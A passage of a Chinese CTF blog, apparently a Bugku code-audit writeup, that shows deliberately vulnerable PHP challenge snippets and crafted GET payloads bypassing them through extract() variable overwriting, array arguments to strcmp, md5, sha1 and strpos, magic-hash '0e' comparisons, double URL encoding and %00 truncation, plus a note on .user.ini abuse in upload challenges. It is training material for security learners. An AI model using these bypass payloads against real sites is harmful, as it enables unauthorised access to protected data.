contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*过滤了 &quot; &lt;? &quot; ,这个加上上面一条过滤，htacess的图片马和一句话基本都挂了*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$image_type</span>)</span><br><span class="line">  &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*要修改一下 “Content-Type”的值*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$userdir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$name</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$upload_file_path</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . <span class="variable">$userdir</span>. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$userdir</span>));</span><br><span class="line">&#125;                   </span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h3><p><strong>.user.ini</strong> 类似**.htaccess<strong>文件<br>它比</strong>.htaccess<strong>用的更广，不管是 <code>nginx/apache/IIS</code>，只要是以fastcgi运行的php都可以用这个方法<br><strong>.user.ini</strong>实际上就是一个可以由用户<code>&quot;自定义&quot;</code>的php.ini　<br>修改了</strong>.user.ini**后，不需要重启服务器中间件，只需要等待 <code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载　</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku吹头发 writeup（慢慢更）</title>
    <url>/yakko117/2019/04/05/Bugkuctf/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>比较简单的把一些常见漏洞作为题目出了出来</p>
<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p><a href="http://www.runoob.com/php/func-array-extract.html">extract()函数解释</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>根据以上代码，要求<code>$shiyan==content</code> 才能得到flag，构造Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php?shiyan=&amp;content=</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p>这个我以前在php弱类型时写过如何去绕过</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/6.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code> </p>
<p>如果 <code>str1</code> 小于 <code>str2</code> 返回 &lt;0； 如果 <code>str1</code> 大于 <code>str2</code>返回 &gt;0；如果两者相等，返回0。<br>所以必须让他们两个相等才可以，用数组进行绕过，构造Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.php?a[]=1</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/10.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>首先分析代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) <span class="comment">//不能让他匹配成功</span></span><br><span class="line"><span class="comment">//其次 进行了urldecode解码，解码后为hackerDJ</span></span><br><span class="line">_GET[id] = <span class="title function_ invoke__">urldecode</span>(_GET[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p><code>$get</code> 进行传参的时候一般都进行了一次解码，下面又进行了一次解码。<br>本题目也提示了为为二次解码<br>所以我们将 <code>hackerDJ</code> 中的一个字母进行二次编码即可<br><code>h</code> –&gt; <code>%68</code><br><code>%</code> –&gt; <code>%25</code><br><code>hackerDJ</code> –&gt; <code>%2568ackerDJ</code><br>所以构造Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.php?id=%2568ackerDJ</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/18.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Your password can not be your username.&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>关键句如下，要求 <code>username</code> 不能等于 <code>password</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;])</span><br></pre></td></tr></table></figure></div>
<p>又因为是全等(三个等号)，无法利用弱类型漏洞<br>构造 <code>0e</code> 开头的字符串</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;]))</span><br></pre></td></tr></table></figure></div>
<p>所以直接构造数组绕过,Payload如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18.php?username[]=QNKCDZO&amp;password[]=240610708</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/19.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>还是数组绕过…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">19.php?password[]=1</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/22.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="variable">$temp</span>)?<span class="keyword">die</span>(<span class="string">&quot;no numeric&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure></div>

<p>这个我在原来的弱类型分析里也提到过了<br>代码要求不能为数字， 又说要求 <code>$temp&gt;1336</code><br>构造Paylod：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22.php?password=1337a</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/7.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your password can not be your name!&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Login first!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>根据题目意思，首先 <code>_GET[&#39;name&#39;]</code>， <code>_GET[&#39;password&#39;]</code> 两者不能相等；然后<code>sha1(_GET[&#39;name&#39;])</code> 和 <code>sha1(_GET[&#39;password&#39;])</code>必须全等才能得到flag；<br>emmmm 数组绕过就好了<br>Payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.php?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/13.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$md51</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$md52</span> = @<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>应该是 <code>0e</code> 开头的漏洞，Payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13.php?a=240610708</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/20.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$temp</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$one</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="variable">$nine</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="variable">$number</span> = <span class="string">&#x27;3735929054&#x27;</span>;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line"><span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;flase&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span> == <span class="variable">$temp</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">noother_says_correct</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>number</code> 等于 <code>temp</code> 则返回flag<br><code>if (($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine))</code><br>大于等于1 小于等于9 都不行<br>要求 <code>temp = number = 3735929054</code><br>用十六进制绕过<br><code>0xdeadc0de = 3735929054</code><br>Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20.php?password=0xdeadc0de</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>打不开</p>
<hr>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/5.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;-&#x27;</span>) !== <span class="literal">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;- have not been found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>代码分析：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+&quot;,_GET[&#x27;password&#x27;]) === FALSE)</span><br></pre></td></tr></table></figure></div>

<p><code>password</code> 匹配必须 a-zA-Z0-9 之中，这个可以用%00截断</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (strlen(_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp;_GET[&#x27;password&#x27;] &gt; 9999999)</span><br></pre></td></tr></table></figure></div>
<p><code>password</code> 小于8位数 且 大于9999999，这个用数组绕过</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE)</span><br></pre></td></tr></table></figure></div>
<p>同样可以用数组绕过, Payload如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.php?password[]=a%00</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/15.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[1-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;必须输入数字才行&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="string">&#x27;#biubiubiu&#x27;</span>) !== <span 